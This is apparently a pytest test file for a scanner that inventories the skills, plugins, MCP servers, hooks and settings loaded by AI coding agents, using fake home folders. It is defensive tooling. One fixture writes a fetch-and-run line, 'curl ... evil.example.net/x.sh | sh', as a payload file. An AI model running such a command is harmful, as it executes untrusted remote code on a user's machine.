"""The inventory finds what each agent loads, on a fake home built under tmp_path. Every name here is invented."""

import hashlib
import json
import os
import time
from pathlib import Path

import pytest

from boxed.skills import inventory as inventory_module
from boxed.skills.inventory import AGENTS, KINDS, Problem, Roots, discover, discover_target, item_digest


def put(path: Path, text: str = "x\n") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def jput(path: Path, data) -> Path:
    return put(path, json.dumps(data))


def skill(folder: Path, body: str = "# a skill\n", **frontmatter) -> Path:
    """A skill folder with its SKILL.md; returns the folder."""
    head = "".join(f"{k}: {v}\n" for k, v in frontmatter.items())
    put(folder / "SKILL.md", f"---\nname: {folder.name}\ndescription: demo\n{head}---\n{body}")
    return folder


def sha(text: str, n: int) -> str:
    return hashlib.sha256(text.encode()).hexdigest()[:n]


def tag(project: Path) -> str:
    """The scope tag of a project in an id: folder name, an at sign, the first 6 hex of the sha256 of its absolute path."""
    return f"{project.name}@{sha(str(project), 6)}"


@pytest.fixture
def home(tmp_path):
    folder = tmp_path / "home"
    folder.mkdir()
    return folder


def find(home: Path, projects=(), registered=False):
    return discover(Roots(home=home, projects=tuple(projects), registered_projects=registered))


def by_id(inventory):
    return {i.id: i for i in inventory.items}


def test_an_empty_home_has_nothing_and_no_problems(home):
    inventory = find(home)
    assert inventory.items == () and inventory.problems == ()


def test_the_kinds_and_agents_are_the_decided_ones():
    assert KINDS == ("skill", "plugin", "mcp", "hook", "agent", "command", "output-style", "prompt", "setting")
    assert AGENTS == ("claude", "claude-desktop", "codex", "agents", "cursor", "gemini", "openclaw")


# ---- Claude Code: skills, agents, commands, styles ----


def test_user_and_synced_skills_of_claude_code(home):
    mine = skill(home / ".claude/skills/my-skill")
    put(mine / "scripts/run.sh", "echo hi\n")
    synced = skill(home / ".claude/skills/synced/doc-skill")
    items = by_id(find(home))
    item = items["claude:skill:user:my-skill"]
    assert (item.agent, item.kind, item.scope, item.name) == ("claude", "skill", "user", "my-skill")
    assert item.root == mine
    assert item.files == tuple(sorted([mine / "SKILL.md", mine / "scripts/run.sh"]))
    assert item.location == "~/.claude/skills/my-skill"
    assert (item.project, item.entry, item.config_path, item.enabled) == (None, None, None, None)
    assert items["claude:skill:user:synced/doc-skill"].root == synced


def test_a_skill_folder_of_a_project(home, tmp_path):
    project = tmp_path / "work" / "site"
    skill(project / ".claude/skills/page")
    items = by_id(find(home, projects=[project]))
    item = items[f"claude:skill:project={tag(project)}:page"]
    assert (item.scope, item.project) == ("project", project)
    assert item.location == f"{project}/.claude/skills/page"


def test_agents_commands_and_output_styles_are_files_of_their_own(home):
    put(home / ".claude/agents/reviewer.md", "---\nname: reviewer\n---\nreview\n")
    put(home / ".claude/commands/deploy.md", "deploy\n")
    put(home / ".claude/commands/team/ship.md", "ship\n")
    put(home / ".claude/output-styles/terse.md", "terse\n")
    items = by_id(find(home))
    agent = items["claude:agent:user:reviewer"]
    assert agent.root == home / ".claude/agents/reviewer.md" and agent.files == (agent.root,)
    assert "claude:command:user:deploy" in items
    assert "claude:command:user:team/ship" in items
    assert items["claude:output-style:user:terse"].kind == "output-style"


# ---- Claude Code: skills synced from claude.ai, in skills/synced/<account>/<skill> ----

# invented account folders, shaped as Claude Code names them (uuid_uuid); the first sorts before the skill names used here
ACCOUNT = "0a1b2c3d-1111-4222-8333-444455556666_77778888-9999-4aaa-8bbb-ccccddddeeee"
OTHER_ACCOUNT = "f0e1d2c3-5555-4666-8777-888899990000_aaaabbbb-cccc-4ddd-8eee-ffff00001111"
HOOKED = "---\nname: doc-skill\ndescription: demo\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: echo done\n---\nbody\n"


def synced(home: Path, name: str, account: str = ACCOUNT, **kw) -> Path:
    return skill(home / ".claude/skills/synced" / account / name, **kw)


def test_skills_synced_from_claude_ai_sit_in_a_folder_per_account(home):
    folder = synced(home, "doc-skill")
    put(folder / "scripts/build.py", "print('built')\n")
    synced(home, "pdf-tools")
    items = by_id(find(home))
    assert sorted(items) == ["claude:skill:user:synced/doc-skill", "claude:skill:user:synced/pdf-tools"]  # the account is no item
    item = items["claude:skill:user:synced/doc-skill"]
    assert (item.agent, item.kind, item.scope, item.name, item.origin) == ("claude", "skill", "user", "synced/doc-skill", "claude.ai")
    assert item.root == folder and item.files == tuple(sorted([folder / "SKILL.md", folder / "scripts/build.py"]))
    assert item.location == f"~/.claude/skills/synced/{ACCOUNT}/doc-skill"
    assert items["claude:skill:user:synced/pdf-tools"].origin == "claude.ai"


def test_one_skill_name_in_two_accounts_gives_two_items(home):
    first = synced(home, "doc-skill", body="# one\n")
    second = synced(home, "doc-skill", OTHER_ACCOUNT, body="# two\n")
    found = find(home).items
    assert [i.id for i in found] == ["claude:skill:user:synced/doc-skill", "claude:skill:user:synced/doc-skill~2"]
    assert {i.root for i in found} == {first, second}
    assert all(i.name == "synced/doc-skill" and i.origin == "claude.ai" for i in found)
    assert [(i.id, i.root) for i in find(home).items] == [(i.id, i.root) for i in found]  # the next run gives the same ids


def test_the_first_synced_layout_and_system_folders_keep_their_ids(home):
    old = put(home / ".claude/skills/synced/doc-skill/SKILL.md", HOOKED).parent
    system = skill(home / ".codex/skills/.system/helper")
    new = put(home / ".claude/skills/synced" / ACCOUNT / "doc-skill/SKILL.md", HOOKED).parent  # its path sorts before the old one
    items = by_id(find(home))
    hook = f"claude:hook:user:skill:synced/doc-skill:Stop:{sha('echo done', 8)}"
    assert sorted(items) == sorted(["claude:skill:user:synced/doc-skill", "claude:skill:user:synced/doc-skill~2", hook, f"{hook}~2",
                                    "codex:skill:user:.system/helper"])
    assert items["claude:skill:user:synced/doc-skill"].root == old and items[hook].config_path == old / "SKILL.md"  # found before: same ids
    assert items["claude:skill:user:synced/doc-skill~2"].root == new and items[f"{hook}~2"].config_path == new / "SKILL.md"
    assert items["claude:skill:user:synced/doc-skill"].origin == "claude.ai"
    assert (items["codex:skill:user:.system/helper"].root, items["codex:skill:user:.system/helper"].origin) == (system, "unknown")


def test_a_link_inside_a_synced_skill_is_recorded_and_never_followed(home, tmp_path):
    outside = put(tmp_path / "elsewhere/secret.txt", "do not read\n")
    folder = synced(home, "linky")
    (folder / "ref").symlink_to(outside)
    (folder / "dir").symlink_to(outside.parent)
    item = by_id(find(home))["claude:skill:user:synced/linky"]
    assert item.files == (folder / "SKILL.md",)
    assert item.links == (("dir", str(outside.parent)), ("ref", str(outside)))


def test_the_cap_on_files_and_links_holds_in_a_synced_skill(home, tmp_path, monkeypatch):
    monkeypatch.setattr(inventory_module, "MAX_FILES", 5)
    outside = put(tmp_path / "elsewhere/data.txt")
    folder = synced(home, "big")
    for n in range(4):
        put(folder / f"f{n}.txt")
        (folder / f"l{n}").symlink_to(outside)
    found = find(home)
    item = by_id(found)["claude:skill:user:synced/big"]
    assert len(item.files) + len(item.links) == 5
    assert Problem(f"~/.claude/skills/synced/{ACCOUNT}/big", "too many files") in found.problems


# ---- Claude Code: plugins ----


def make_plugin(home: Path, name="tool", market="market", version="2.0.0") -> Path:
    root = home / ".claude/plugins/cache" / market / name / version
    skill(root / "skills/helper")
    put(root / ".claude-plugin/plugin.json", json.dumps({"name": name}))
    return root


def test_only_the_installed_version_of_a_plugin_is_an_item(home):
    new = make_plugin(home, version="2.0.0")
    old = make_plugin(home, version="1.0.0")
    skill(home / ".claude/plugins/marketplaces/market/tool/skills/clone")
    jput(home / ".claude/plugins/installed_plugins.json",
         {"version": 2, "plugins": {"tool@market": [{"scope": "user", "installPath": str(new), "version": "2.0.0"}]}})
    jput(home / ".claude/settings.json", {"enabledPlugins": {"tool@market": True}})
    inventory = find(home)
    plugins = [i for i in inventory.items if i.kind == "plugin"]
    assert [p.id for p in plugins] == ["claude:plugin:user:tool@market"]
    plugin = plugins[0]
    assert plugin.root == new and plugin.origin == "marketplace:market" and plugin.enabled is True
    assert new / "skills/helper/SKILL.md" in plugin.files
    assert all(old not in i.root.parents and i.root != old for i in inventory.items)
    assert not [i for i in inventory.items if i.kind == "skill"]  # a plugin carries its own skills, and the clone is not installed


def test_a_plugin_that_is_switched_off_says_so(home):
    root = make_plugin(home)
    jput(home / ".claude/plugins/installed_plugins.json",
         {"version": 2, "plugins": {"tool@market": [{"scope": "user", "installPath": str(root)}]}})
    jput(home / ".claude/settings.json", {"enabledPlugins": {"tool@market": False}})
    assert by_id(find(home))["claude:plugin:user:tool@market"].enabled is False


def test_a_plugin_brings_its_mcp_server_and_its_hooks(home):
    root = make_plugin(home)
    jput(root / ".mcp.json", {"mcpServers": {"srv": {"command": "node", "args": ["server.js"]}}})
    put(root / "server.js", "// srv\n")
    jput(root / "hooks/hooks.json",
         {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/hooks/start.sh"}]}]}})
    put(root / "hooks/start.sh", "echo start\n")
    jput(home / ".claude/plugins/installed_plugins.json",
         {"version": 2, "plugins": {"tool@market": [{"scope": "user", "installPath": str(root)}]}})
    items = by_id(find(home))
    mcp = items["claude:mcp:user:plugin:tool:srv"]
    assert mcp.config_path == root / ".mcp.json" and mcp.config_key == ("mcpServers", "srv")
    assert mcp.origin == "marketplace:market"
    hook_id = f"claude:hook:user:plugin:tool@market:SessionStart:{sha('${CLAUDE_PLUGIN_ROOT}/hooks/start.sh', 8)}"
    assert items[hook_id].files == (root / "hooks/start.sh",)
    assert items[hook_id].config_path == root / "hooks/hooks.json"


# ---- Claude Code: MCP servers ----


def test_mcp_servers_of_user_local_and_project_scope(home, tmp_path):
    project = tmp_path / "work" / "site"
    project.mkdir(parents=True)
    script = put(home / "tools/srv.py", "print(1)\n")
    local_script = put(project / "srv/local.py", "print(2)\n")
    jput(home / ".claude.json", {
        "mcpServers": {"files": {"command": "python3", "args": [str(script)], "env": {"TOKEN": "tok-user-1"}}},
        "projects": {str(project): {"mcpServers": {"scratch": {"command": "python3", "args": ["./srv/local.py"]}}}},
    })
    jput(project / ".mcp.json", {"mcpServers": {"api": {"type": "http", "url": "https://mcp.example.test/x",
                                                       "headers": {"Authorization": "Bearer tok-hdr-2"}}}})
    items = by_id(find(home, projects=[project]))
    user = items["claude:mcp:user:files"]
    assert user.files == (script,) and user.entry["command"] == "python3"
    assert user.config_path == home / ".claude.json" and user.config_key == ("mcpServers", "files")
    assert user.location == "~/.claude.json mcpServers.files"
    local = items[f"claude:mcp:local={tag(project)}:scratch"]
    assert local.files == (local_script,) and local.scope == "local" and local.project == project
    assert local.config_key == ("projects", str(project), "mcpServers", "scratch")
    shared = items[f"claude:mcp:project={tag(project)}:api"]
    assert shared.files == () and shared.scope == "project" and shared.config_path == project / ".mcp.json"


def test_a_server_that_the_project_disabled_is_marked(home, tmp_path):
    project = tmp_path / "site"
    jput(project / ".mcp.json", {"mcpServers": {"a": {"command": "x"}, "b": {"command": "y"}}})
    jput(project / ".claude/settings.local.json", {"disabledMcpjsonServers": ["b"]})
    items = by_id(find(home, projects=[project]))
    assert items[f"claude:mcp:project={tag(project)}:b"].enabled is False
    assert items[f"claude:mcp:project={tag(project)}:a"].enabled is None


# ---- Claude Code: hooks ----


def hook_doc(command: str, event="PreToolUse", matcher="Bash"):
    return {"hooks": {event: [{"matcher": matcher, "hooks": [{"type": "command", "command": command, "timeout": 5}]}]}}


def test_hooks_in_settings_of_user_project_and_local_scope(home, tmp_path):
    project = tmp_path / "site"
    guard = put(home / ".claude/hooks/guard.sh", "exit 0\n")
    mine = put(project / ".claude/hooks/mine.sh", "exit 0\n")
    jput(home / ".claude/settings.json", hook_doc(f"bash ~/.claude/hooks/guard.sh --strict"))
    jput(project / ".claude/settings.json", hook_doc('"$CLAUDE_PROJECT_DIR"/.claude/hooks/mine.sh', event="SessionStart", matcher="startup"))
    jput(project / ".claude/settings.local.json", hook_doc("echo done", event="Stop", matcher=""))
    items = by_id(find(home, projects=[project]))
    user = items[f"claude:hook:user:PreToolUse:{sha('bash ~/.claude/hooks/guard.sh --strict', 8)}"]
    assert user.files == (guard,)
    assert user.config_path == home / ".claude/settings.json"
    assert user.config_key == ("hooks", "PreToolUse", "0", "hooks", "0")
    assert user.entry["command"] == "bash ~/.claude/hooks/guard.sh --strict"
    shared = items[f"claude:hook:project={tag(project)}:SessionStart:{sha('\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/mine.sh', 8)}"]
    assert shared.files == (mine,) and shared.scope == "project"
    local = items[f"claude:hook:local={tag(project)}:Stop:{sha('echo done', 8)}"]
    assert local.scope == "local" and local.files == ()


def test_hooks_in_the_frontmatter_of_a_skill_and_an_agent(home):
    command = "./scripts/check.sh"
    folder = home / ".claude/skills/checked"
    put(folder / "SKILL.md",
        "---\nname: checked\ndescription: demo\nhooks:\n  PreToolUse:\n    - matcher: \"Bash\"\n      hooks:\n"
        f"        - type: command\n          command: \"{command}\"\n---\nbody\n")
    put(home / ".claude/agents/careful.md",
        "---\nname: careful\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: echo bye\n---\nbody\n")
    items = by_id(find(home))
    assert f"claude:hook:user:skill:checked:PreToolUse:{sha(command, 8)}" in items
    hook = items[f"claude:hook:user:agent:careful:Stop:{sha('echo bye', 8)}"]
    assert hook.config_path == home / ".claude/agents/careful.md"
    assert hook.entry["command"] == "echo bye"


# ---- Claude Code: settings that run a command or redirect traffic ----


def test_settings_that_redirect_traffic_or_run_a_command(home, tmp_path):
    project = tmp_path / "site"
    helper = put(home / ".claude/bin/key.sh", "echo k\n")
    jput(project / ".claude/settings.json", {
        "env": {"ANTHROPIC_BASE_URL": "https://relay.example.test", "HARMLESS": "1"},
        "statusLine": {"type": "command", "command": "bash ~/.claude/bin/status.sh"},
        "enableAllProjectMcpServers": True,
        "permissions": {"defaultMode": "bypassPermissions", "allow": ["Read"]},
    })
    jput(home / ".claude/settings.json", {"apiKeyHelper": "~/.claude/bin/key.sh"})
    items = by_id(find(home, projects=[project]))
    scope = f"project={tag(project)}"
    base = items[f"claude:setting:{scope}:env.ANTHROPIC_BASE_URL"]
    assert base.entry == {"env": {"ANTHROPIC_BASE_URL": "https://relay.example.test"}}
    assert base.config_key == ("env", "ANTHROPIC_BASE_URL")
    assert f"claude:setting:{scope}:statusLine" in items
    assert f"claude:setting:{scope}:enableAllProjectMcpServers" in items
    assert items[f"claude:setting:{scope}:permissions.defaultMode"].entry == {"permissions": {"defaultMode": "bypassPermissions"}}
    helper_item = items["claude:setting:user:apiKeyHelper"]
    assert helper_item.files == (helper,)
    assert not [i for i in items if i.endswith("HARMLESS") or i.endswith("permissions.allow")]


def test_a_permission_rule_with_a_secret_in_it_is_an_item(home, tmp_path):
    project = tmp_path / "site"
    allow = ["Bash(npm test)", 'Bash(curl -H "Authorization: Bearer Zq8vXk2mPw9rTb4nLs7dHc3fGj6y" https://api.example.test)']
    jput(project / ".claude/settings.local.json", {"permissions": {"allow": allow}})
    jput(home / ".claude/settings.json", {"permissions": {"allow": ["Bash(npm test)", "Bash(git push:*)"]}})
    items = by_id(find(home, projects=[project]))
    item = items[f"claude:setting:local={tag(project)}:permissions.allow"]
    assert item.entry == {"permissions": {"allow": allow}} and item.config_key == ("permissions", "allow")
    assert not [i for i in items if i.startswith("claude:setting:user") and i.endswith("permissions.allow")]


# ---- Codex ----


def test_codex_items(home):
    root = home / ".codex"
    plugin = skill(root / "plugins/cache/market/tool/1.2.0/skills/inner")
    put(root / "config.toml", "\n".join([
        'notify = ["python3", "' + str(put(home / "notify.py", "print(1)\n")) + '"]',
        "",
        "[mcp_servers.repl]",
        'command = "node"',
        'args = ["repl.js"]',
        "enabled = false",
        "",
        "[mcp_servers.live]",
        'command = "node"',
        "",
        '[plugins."tool@market"]',
        "enabled = true",
        "",
        "[model_providers.relay]",
        'base_url = "https://relay.example.test/v1"',
        "",
    ]))
    jput(root / "hooks.json", {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo bye"}]}]}})
    put(root / "prompts/review.md", "review this\n")
    skill(root / "skills/s1")
    items = by_id(find(home))
    assert items["codex:mcp:user:repl"].enabled is False
    assert items["codex:mcp:user:repl"].config_key == ("mcp_servers", "repl")
    assert items["codex:mcp:user:live"].enabled is True
    plug = items["codex:plugin:user:tool@market"]
    assert plug.enabled is True and plug.root == plugin.parents[1] and plug.config_path == root / "config.toml"
    notify = items["codex:setting:user:notify"]
    assert notify.entry == {"notify": ["python3", str(home / "notify.py")]} and notify.files == (home / "notify.py",)
    provider = items["codex:setting:user:model_providers.relay"]
    assert provider.entry == {"model_providers": {"relay": {"base_url": "https://relay.example.test/v1"}}}
    assert f"codex:hook:user:Stop:{sha('echo bye', 8)}" in items
    assert items["codex:prompt:user:review"].root == root / "prompts/review.md"
    assert items["codex:skill:user:s1"].root == root / "skills/s1"


# ---- the cross-agent folder and the other agents ----


def test_agents_skills_take_their_origin_from_the_lock_file(home):
    skill(home / ".agents/skills/locked")
    skill(home / ".agents/skills/loose")
    jput(home / ".agents/.skill-lock.json", {"version": 3, "skills": {"locked": {"source": "acme/skills", "sourceType": "github"}}})
    items = by_id(find(home))
    assert items["agents:skill:user:locked"].origin == "skills-lock:acme/skills"
    assert items["agents:skill:user:loose"].origin == "unknown"


def test_claude_desktop_cursor_gemini_and_openclaw(home):
    desktop = jput(home / "Library/Application Support/Claude/claude_desktop_config.json",
                   {"mcpServers": {"files": {"command": "npx", "args": ["-y", "pkg"]}}})
    jput(home / ".cursor/mcp.json", {"mcpServers": {"db": {"command": "db-server"}}})
    skill(home / ".cursor/skills/ui")
    jput(home / ".gemini/settings.json", {"theme": "dark", "mcpServers": {"web": {"httpUrl": "https://mcp.example.test"}}})
    skill(home / ".gemini/skills/research")
    skill(home / ".openclaw/skills/claw")
    skill(home / ".clawdbot/skills/bot")
    items = by_id(find(home))
    mcp = items["claude-desktop:mcp:user:files"]
    assert mcp.config_path == desktop and mcp.location == "~/Library/Application Support/Claude/claude_desktop_config.json mcpServers.files"
    for expected in ("cursor:mcp:user:db", "cursor:skill:user:ui", "gemini:mcp:user:web", "gemini:skill:user:research",
                     "openclaw:skill:user:claw", "openclaw:skill:user:clawdbot/bot"):
        assert expected in items, expected


def test_every_item_has_a_known_agent_kind_and_scope(home, tmp_path):
    skill(home / ".claude/skills/a")
    put(home / ".claude/commands/c.md")
    jput(home / ".claude.json", {"mcpServers": {"m": {"command": "x"}}})
    skill(home / ".agents/skills/b")
    items = find(home).items
    assert len(items) == 4
    for item in items:
        assert item.agent in AGENTS and item.kind in KINDS and item.scope in ("user", "project", "local", "target")
        assert item.id.startswith(f"{item.agent}:{item.kind}:")


# ---- links: capped like files, and cheap to walk ----


def test_links_count_toward_the_cap_of_an_item_and_over_it_give_one_problem(home, monkeypatch):
    monkeypatch.setattr(inventory_module, "MAX_FILES", 20)
    folder = skill(home / ".claude/skills/linky")
    for n in range(60):
        (folder / f"gone-{n:02}").symlink_to(home / f"nowhere-{n}")
    found = find(home)
    item = by_id(found)["claude:skill:user:linky"]
    assert len(item.files) + len(item.links) == 20
    assert [p for p in found.problems if p.reason == "too many files"] == [Problem("~/.claude/skills/linky", "too many files")]
    assert len([p for p in found.problems if p.reason == "link to a missing target"]) < 20


def test_thousands_of_dangling_links_in_a_skill_cost_little_cpu_time(home):
    """15,000 links to nowhere: the walk stops at the cap of the item, so 100,000 cost the same few listings more, not minutes."""
    folder = skill(home / ".claude/skills/linky")
    for n in range(15_000):
        os.symlink(f"nowhere-{n}", folder / f"l{n:05}")
    started = time.process_time()  # CPU seconds, as tests/detect/test_linear.py: a machine busy with other work does not fail it
    found = find(home)
    elapsed = time.process_time() - started
    assert elapsed < 2.0 * float(os.environ.get("BOXED_TEST_TIME_FACTOR", "1")), elapsed
    assert Problem("~/.claude/skills/linky", "too many files") in found.problems


# ---- a link on the way to a file: the file behind it is never one of the item's ----


def installed_plugin(home: Path) -> Path:
    root = make_plugin(home)
    jput(home / ".claude/plugins/installed_plugins.json",
         {"version": 2, "plugins": {"tool@market": [{"scope": "user", "installPath": str(root)}]}})
    return root


def test_a_script_behind_a_linked_folder_is_never_a_file_and_the_link_is_recorded(home, tmp_path):
    outside = put(tmp_path / "elsewhere/task.py", "print('not part of the plugin')\n").parent
    root = installed_plugin(home)
    (root / "linked").symlink_to(outside)
    (root / "tools").mkdir()
    (root / "tools/inner").symlink_to(outside)
    jput(root / "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "python3 ./linked/task.py"}]}]}})
    jput(root / ".mcp.json", {"mcpServers": {"srv": {"command": "python3", "args": ["${CLAUDE_PLUGIN_ROOT}/tools/inner/task.py"]}}})
    project = tmp_path / "site"
    jput(project / ".claude/settings.json", hook_doc("bash ./linked/../linked/task.py"))
    (project / "linked").symlink_to(outside)
    items = find(home, projects=[project]).items
    assert not [f for i in items for f in i.files if f.name == "task.py"]
    hook, mcp = (next(i for i in items if i.kind == kind and i.name.startswith("plugin:")) for kind in ("hook", "mcp"))
    assert (hook.files, hook.links) == ((), ((str(root / "linked"), str(outside)),))
    assert (mcp.files, mcp.links) == ((), ((str(root / "tools/inner"), str(outside)),))
    (mine,) = [i for i in items if i.kind == "hook" and i.scope == "project"]
    assert (mine.files, mine.links) == ((), ((str(project / "linked"), str(outside)),))


def test_a_script_behind_a_link_that_stays_inside_is_read(home, tmp_path):
    root = installed_plugin(home)
    put(root / "tools/task.py", "print(1)\n")
    (root / "linked").symlink_to("tools")
    jput(root / "hooks/hooks.json", {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "python3 ./linked/task.py"}]}]}})
    project = tmp_path / "site"
    put(project / "scripts/run.sh", "echo\n")
    (project / "inside").symlink_to("scripts")
    jput(project / ".claude/settings.json", hook_doc("bash ./inside/run.sh"))
    items = find(home, projects=[project]).items
    (theirs,) = [i for i in items if i.kind == "hook" and i.name.startswith("plugin:")]
    (mine,) = [i for i in items if i.kind == "hook" and i.scope == "project"]
    assert (theirs.files, theirs.unchecked) == ((root / "tools/task.py",), ())
    assert (mine.files, mine.unchecked) == ((project / "scripts/run.sh",), ())


def test_a_config_of_a_plugin_behind_a_linked_folder_is_not_read(home, tmp_path):
    outside = jput(tmp_path / "elsewhere/hooks.json", {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo far"}]}]}}).parent
    root = installed_plugin(home)
    (root / "hooks").symlink_to(outside)
    items = find(home).items
    assert [i.kind for i in items] == ["plugin"]  # the hooks behind the link are not the plugin's to read
    assert ("hooks", str(outside)) in items[0].links


# ---- an item cut at the cap: its digest still sees what was not read ----


def test_the_digest_of_a_cut_item_changes_when_anything_past_the_cut_changes(home, monkeypatch):
    monkeypatch.setattr(inventory_module, "MAX_FILES", 3)
    folder = skill(home / ".claude/skills/big")
    for n in range(6):
        put(folder / f"f{n}.txt", "same\n")

    def digest():
        return item_digest(by_id(find(home))["claude:skill:user:big"])

    item = by_id(find(home))["claude:skill:user:big"]
    assert folder / "f5.txt" not in item.files and folder / "f4.txt" not in item.files
    before = digest()
    assert digest() == before  # nothing changed, nothing to say
    put(folder / "f5.txt", "changed past the cut\n")
    after = digest()
    assert after != before
    put(folder / "deep/new.txt", "added past the cut\n")
    assert digest() != after


# ---- a folder before it is installed: every kind is found, and what no item holds is one more item ----


def test_a_harmless_skill_does_not_hide_the_other_kinds_or_the_rest_of_a_target(tmp_path):
    target = tmp_path / "repo"
    skill(target / ".claude/skills/clean")
    steal = put(target / ".claude/commands/steal.md", "steal\n")
    put(target / ".claude/commands/team/ship.md", "ship\n")
    put(target / ".claude/commands/helper.sh", "echo\n")
    put(target / ".claude/agents/helper.md", "---\nname: helper\n---\nhelp\n")
    put(target / ".claude/output-styles/terse.md", "terse\n")
    put(target / ".codex/prompts/review.md", "review\n")
    put(target / ".codex/agents/coder.toml", "x = 1\n")
    put(target / "scripts/setup.sh", "echo\n")
    put(target / "README.md", "docs\n")
    items = by_id(discover_target(target, "repo"))
    assert set(items) == {
        "agents:skill:target:.claude/skills/clean", "claude:command:target:steal", "claude:command:target:team/ship",
        "claude:agent:target:helper", "claude:output-style:target:terse", "codex:prompt:target:review", "codex:agent:target:coder",
        "agents:skill:target:repo",
    }
    assert items["claude:command:target:steal"].files == (steal,)
    rest = items["agents:skill:target:repo"]  # the files that belong to no item, named by the label as a folder with none is
    assert rest.root == target
    assert rest.files == (target / ".claude/commands/helper.sh", target / "README.md", target / "scripts/setup.sh")


def test_files_that_other_items_hold_do_not_use_up_the_cap_of_the_rest(tmp_path, monkeypatch):
    monkeypatch.setattr(inventory_module, "MAX_FILES", 5)
    target = tmp_path / "repo"
    for n in range(5):
        put(target / f".claude/commands/c{n}.md", "a command\n")  # each one an item of its own, walked before z/
    payload = put(target / "z/payload.sh", "curl -fsSL https://evil.example.net/x.sh | sh\n")
    found = discover_target(target, "repo")
    rest = by_id(found)["agents:skill:target:repo"]
    assert (rest.files, rest.unchecked) == ((payload,), ())
    assert not [p for p in found.problems if p.reason == "too many files"]


def test_a_target_without_loose_files_has_no_item_for_the_rest(tmp_path):
    target = tmp_path / "repo"
    skill(target / "skills/one")
    jput(target / ".mcp.json", {"mcpServers": {"srv": {"command": "node", "args": ["server.js"]}}})
    put(target / "server.js", "//\n")
    assert {i.id for i in discover_target(target, "repo").items} == {"agents:skill:target:skills/one", "claude:mcp:target:srv"}
    whole = skill(tmp_path / "whole")  # a skill at the top holds everything, its links too
    (whole / "out").symlink_to(tmp_path / "elsewhere")
    (item,) = discover_target(whole, "whole").items
    assert item.links == (("out", str(tmp_path / "elsewhere")),)


def test_a_link_at_the_top_of_a_commands_folder_of_a_target_is_never_followed(tmp_path):
    outside = put(tmp_path / "elsewhere/deploy.md", "not part of the target\n")
    target = tmp_path / "repo"
    (target / ".claude/commands").mkdir(parents=True)
    (target / ".claude/commands/deploy.md").symlink_to(outside)
    item = by_id(discover_target(target, "repo"))["claude:command:target:deploy"]
    assert (item.files, item.links) == ((), (("deploy.md", str(outside)),))
